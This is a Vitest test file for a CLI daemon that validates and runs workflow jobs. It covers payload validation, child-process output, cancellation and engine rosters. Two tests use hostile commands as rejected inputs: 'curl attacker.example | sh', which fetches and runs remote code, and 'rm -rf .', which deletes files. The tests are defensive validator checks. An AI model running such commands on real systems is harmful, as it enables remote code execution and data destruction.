import { describe, expect, it, vi } from 'vitest';
import { getEventListeners } from 'node:events';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createDaemonWorkflowRuntime, emitChunks as physicalEmitChunks, runWorkflowCommand as physicalRunWorkflowCommand, daemonWorkflowKinds as physicalWorkflowKinds } from '@kernlang/agon-mod-jobs';

import {
  buildDaemonWorkflowPlan,
  daemonWorkflowKinds,
  validateDaemonWorkflowEngines,
  resolveDaemonWorkflowJob,
  runWorkflowCommand,
  emitChunks,
} from '../../packages/cli/src/jobs/workflow-job.js';

describe('daemon workflow jobs', () => {
  it('uses the physical Jobs runner through the legacy CLI export', () => {
    expect(runWorkflowCommand).toBe(physicalRunWorkflowCommand);
    expect(emitChunks).toBe(physicalEmitChunks);
    expect(daemonWorkflowKinds).toBe(physicalWorkflowKinds);
  });
  it('validates Jobs payloads before invoking the injected command compiler', () => {
    const buildCommands = vi.fn(() => ({ cwd: process.cwd(), commands: [['review', 'fixture']] }));
    const validateEngineRoster = vi.fn();
    const runtime = createDaemonWorkflowRuntime({
      defaults: { jobLabelMaxChars: 4, jobOutputChunkChars: 32, jobCancelGraceMs: 20 },
      buildCommands, validateEngineRoster,
    });
    for (const payload of [null, [], 'invalid', { autoApprove: true }, { autoApprove: 'yes' }, { shell: 'unexpected' }, { input: 1 }]) {
      expect(() => runtime.buildDaemonWorkflowPlan('review', payload as unknown as Record<string, unknown>)).toThrow();
    }
    expect(() => runtime.buildDaemonWorkflowPlan('unknown', {})).toThrow('not available');
    expect(buildCommands).not.toHaveBeenCalled();
    const plan = runtime.buildDaemonWorkflowPlan('TEAM_BRAINSTORM', { input: '  fixture text  ', engines: 'a,b', autoApprove: false });
    expect(plan).toEqual({ kind: 'team-brainstorm', label: 'fixt', cwd: process.cwd(), commands: [['review', 'fixture']] });
    expect(buildCommands).toHaveBeenCalledExactlyOnceWith({ workflow: 'team-brainstorm', input: '  fixture text  ', engines: 'a,b', cwd: process.cwd() });
    expect(runtime.buildDaemonWorkflowPlan('review', { input: 'fixture' }, 2.9).label).toBe('fi');
    expect(() => runtime.buildDaemonWorkflowPlan('review', {}, 0)).toThrow('jobLabelMaxChars must be a positive integer');
    runtime.validateDaemonWorkflowEngines({ ...plan, commands: [['a', '--engines', 'first,second'], ['b', '--engine', 'third']] });
    expect(validateEngineRoster.mock.calls).toEqual([['first,second', process.cwd()], ['third', process.cwd()]]);
  });

  it.each(['success', 'failure', 'cancel'] as const)('sequences real child commands through the physical Jobs owner: %s', async outcome => {
    const cwd = mkdtempSync(join(tmpdir(), 'agon-job-sequence-'));
    const script = join(cwd, 'fixture.mjs');
    writeFileSync(script, "process.stdout.write(process.argv[2]); process.exitCode = Number(process.argv[3] || 0);\n");
    const runtime = createDaemonWorkflowRuntime({
      defaults: { jobLabelMaxChars: 120, jobOutputChunkChars: 32, jobCancelGraceMs: 20 },
      buildCommands: () => ({ cwd, commands: [['first', outcome === 'failure' ? '7' : '0'], ['second']] }),
      validateEngineRoster: () => {},
    });
    const controller = new AbortController();
    const events: Array<{ type: string; data?: unknown }> = [];
    try {
      const plan = runtime.buildDaemonWorkflowPlan('review', { input: 'fixture', cwd });
      const executor = runtime.createDaemonWorkflowExecutor(plan, { script });
      const result = executor.run({ signal: controller.signal, emit: (type, data) => {
        events.push({ type, data });
        if (outcome === 'cancel' && type === 'command-finished') controller.abort();
      } });
      if (outcome === 'success') {
        await expect(result).resolves.toEqual({ ok: true, phases: [{ command: 'first', exitCode: 0 }, { command: 'second', exitCode: 0 }] });
      } else {
        await expect(result).rejects.toThrow(outcome === 'failure' ? 'first exited with code 7' : 'Cancelled');
      }
      expect(events.filter(event => event.type === 'command-started').map(event => (event.data as { command: string }).command))
        .toEqual(outcome === 'success' ? ['first', 'second'] : ['first']);
      expect(events.filter(event => event.type === 'stdout').map(event => (event.data as { text: string }).text).join(''))
        .toBe(outcome === 'success' ? 'firstsecond' : 'first');
    } finally { controller.abort(); rmSync(cwd, { recursive: true, force: true }); }
  });
  it('preserves subprocess output chunks and the terminal event', async () => {
    const cwd = mkdtempSync(join(tmpdir(), 'agon-job-process-'));
    const script = join(cwd, 'fixture.mjs');
    writeFileSync(script, "process.stdout.write('abcdefgh'); process.stderr.write('stderr'); process.exitCode = 7;\n");
    const events: Array<{ type: string; data?: unknown }> = [];
    try {
      const code = await runWorkflowCommand({ signal: new AbortController().signal, emit: (type, data) => { events.push({ type, data }); } }, script, ['fixture-command'], cwd, 3, 20);
      expect(code).toBe(7);
      const text = (type: string) => events.filter(event => event.type === type).map(event => (event.data as { text: string }).text);
      expect(text('stdout').join('')).toBe('abcdefgh');
      expect(text('stderr').join('')).toBe('stderr');
      expect([...text('stdout'), ...text('stderr')].every(chunk => chunk.length <= 3)).toBe(true);
      expect(events.at(-1)).toEqual({ type: 'command-finished', data: { command: 'fixture-command', exitCode: 7, signal: null } });
    } finally { rmSync(cwd, { recursive: true, force: true }); }
  });

  it('refuses a pre-cancelled command before spawning', async () => {
    const controller = new AbortController();
    controller.abort();
    await expect(runWorkflowCommand({ signal: controller.signal, emit: () => { throw new Error('must not emit'); } }, '/nonexistent/fixture.mjs', [], process.cwd(), 10, 20))
      .rejects.toThrow('Cancelled before workflow command started');
  });

  it('preserves Unicode output from a real child through the public runner', async () => {
    const cwd = mkdtempSync(join(tmpdir(), 'agon-job-unicode-'));
    const script = join(cwd, 'fixture.mjs');
    writeFileSync(script, "const bytes = Buffer.from('é🦒漢字'); for (const byte of bytes) { process.stdout.write(Buffer.from([byte])); process.stderr.write(Buffer.from([byte])); await new Promise(resolve => setTimeout(resolve, 5)); }\n");
    const output: Record<string, string> = { stdout: '', stderr: '' };
    try {
      const code = await runWorkflowCommand({ signal: new AbortController().signal, emit: (type, data) => {
        if (type === 'stdout' || type === 'stderr') output[type] += (data as { text: string }).text;
      } }, script, [], cwd, 3, 20);
      expect(code).toBe(0);
      expect(output).toEqual({ stdout: 'é🦒漢字', stderr: 'é🦒漢字' });
    } finally { rmSync(cwd, { recursive: true, force: true }); }
  });

  it('cancels a real running child and retains its terminal signal', async () => {
    const cwd = mkdtempSync(join(tmpdir(), 'agon-job-cancel-'));
    const script = join(cwd, 'fixture.mjs');
    writeFileSync(script, "setInterval(() => {}, 1000); process.stdout.write('ready');\n");
    const controller = new AbortController();
    const events: Array<{ type: string; data?: unknown }> = [];
    try {
      const code = await runWorkflowCommand({ signal: controller.signal, emit: (type, data) => {
        events.push({ type, data });
        if (type === 'stdout') controller.abort();
      } }, script, ['fixture-command'], cwd, 1024, 20);
      expect(controller.signal.aborted).toBe(true);
      expect(code).toBe(1);
      expect(events.at(-1)).toEqual({ type: 'command-finished', data: { command: 'fixture-command', exitCode: 1, signal: 'SIGTERM' } });
    } finally { controller.abort(); rmSync(cwd, { recursive: true, force: true }); }
  });

  it('escalates cancellation when a real child ignores SIGTERM', async () => {
    const cwd = mkdtempSync(join(tmpdir(), 'agon-job-force-cancel-'));
    const script = join(cwd, 'fixture.mjs');
    writeFileSync(script, "process.on('SIGTERM', () => {}); setInterval(() => {}, 1000); process.stdout.write('ready');\n");
    const controller = new AbortController();
    const events: Array<{ type: string; data?: unknown }> = [];
    try {
      const code = await runWorkflowCommand({ signal: controller.signal, emit: (type, data) => {
        events.push({ type, data });
        if (type === 'stdout') controller.abort();
      } }, script, ['fixture-command'], cwd, 1024, 20);
      expect(code).toBe(1);
      expect(events.at(-1)).toEqual({ type: 'command-finished', data: { command: 'fixture-command', exitCode: 1, signal: 'SIGKILL' } });
    } finally { controller.abort(); rmSync(cwd, { recursive: true, force: true }); }
  });

  it('rejects a real spawn failure and removes its abort listener', async () => {
    const cwd = mkdtempSync(join(tmpdir(), 'agon-job-spawn-failure-'));
    const controller = new AbortController();
    try {
      await expect(runWorkflowCommand({ signal: controller.signal, emit: () => {} },
        'fixture.mjs', [], join(cwd, 'missing'), 10, 20)).rejects.toMatchObject({ code: 'ENOENT' });
      expect(getEventListeners(controller.signal, 'abort')).toEqual([]);
    } finally { controller.abort(); rmSync(cwd, { recursive: true, force: true }); }
  });
  it('exposes a closed registry of supported autonomous workflows', () => {
    expect(daemonWorkflowKinds()).toEqual([
      'brainstorm', 'team-brainstorm', 'tribunal', 'team-tribunal', 'campfire',
      'think', 'nero', 'council', 'research', 'synthesis', 'review', 'doctor',
      'forge', 'team-forge', 'pipeline',
    ]);
  });

  it('builds a registered workflow through the existing call contract', () => {
    const plan = buildDaemonWorkflowPlan('brainstorm', {
      input: 'design a cache',
      engines: 'claude,codex',
      cwd: process.cwd(),
    });

    expect(plan.kind).toBe('brainstorm');
    expect(plan.label).toBe('design a cache');
    expect(plan.cwd).toBe(process.cwd());
    expect(plan.commands).toEqual([
      ['brainstorm', 'design a cache', '--engines', 'claude,codex'],
    ]);
  });

  it('keeps explicitly requested implementation workflows available', () => {
    const forge = buildDaemonWorkflowPlan('forge', {
      input: 'implement the parser',
      cwd: process.cwd(),
    });
    expect(forge.commands[0]).toEqual([
      'forge', 'implement the parser', '--test', 'true', '--cwd', process.cwd(),
    ]);
  });

  it('rejects arbitrary fitness commands instead of forwarding them to a shell', () => {
    expect(() => buildDaemonWorkflowPlan('forge', {
      input: 'implement the parser',
      fitnessCmd: 'curl attacker.example | sh',
    })).toThrow(/unsupported job payload field: fitnessCmd/i);
  });

  it('enforces removed engines for singular --engine workflow options', () => {
    const cwd = mkdtempSync(join(tmpdir(), 'agon-daemon-engine-'));
    try {
      writeFileSync(join(cwd, '.agon.json'), JSON.stringify({ removedEngines: ['codex'] }));
      const plan = buildDaemonWorkflowPlan('review', { input: 'uncommitted', engine: 'codex', cwd });
      expect(() => validateDaemonWorkflowEngines(plan)).toThrow(/hard-removed/i);
    } finally { rmSync(cwd, { recursive: true, force: true }); }
  });

  it('keeps configuration and roster validation ahead of the daemon echo seam', async () => {
    const cwd = mkdtempSync(join(tmpdir(), 'agon-daemon-resolve-'));
    const previousEcho = process.env.AGON_DAEMON_ECHO;
    process.env.AGON_DAEMON_ECHO = '1';
    try {
      writeFileSync(join(cwd, '.agon.json'), JSON.stringify({ removedEngines: ['codex'], jobLabelMaxChars: 3 }));
      expect(() => resolveDaemonWorkflowJob('review', { input: 'uncommitted', engine: 'codex', cwd })).toThrow(/hard-removed/i);
      expect(() => resolveDaemonWorkflowJob('review', { input: 'uncommitted', autoApprove: true, cwd })).toThrow(/autoApprove/i);
      const job = resolveDaemonWorkflowJob('review', { input: 'uncommitted', cwd });
      expect(job.label).toBe('unc');
      const emit = vi.fn();
      await expect(job.executor.run({ signal: new AbortController().signal, emit }))
        .resolves.toEqual({ ok: true, kind: 'review', label: 'unc' });
      expect(emit).toHaveBeenCalledExactlyOnceWith('stdout', { text: 'echo job: unc\n' });
    } finally {
      if (previousEcho === undefined) delete process.env.AGON_DAEMON_ECHO;
      else process.env.AGON_DAEMON_ECHO = previousEcho;
      rmSync(cwd, { recursive: true, force: true });
    }
  });

  it.each(['goal', 'conquer', 'chrome', 'update', 'login', 'provider', 'run', 'commit', 'unknown'])(
    'rejects unregistered workflow %s',
    (kind) => {
      expect(() => buildDaemonWorkflowPlan(kind, { input: 'do it' }))
        .toThrow(/not available as a daemon job/i);
    },
  );

  it('rejects browser-style auto approval even on a registered kind', () => {
    expect(() => buildDaemonWorkflowPlan('review', { input: 'uncommitted', autoApprove: true }))
      .toThrow(/autoApprove/i);
  });

  it('rejects unknown payload fields instead of turning them into argv', () => {
    expect(() => buildDaemonWorkflowPlan('review', { input: 'uncommitted', shell: 'rm -rf .' }))
      .toThrow(/unsupported job payload field: shell/i);
  });

  it('requires a real working directory', () => {
    expect(() => buildDaemonWorkflowPlan('review', { cwd: '/definitely/not/an/agon/workspace' }))
      .toThrow(/working directory does not exist/i);
  });
});
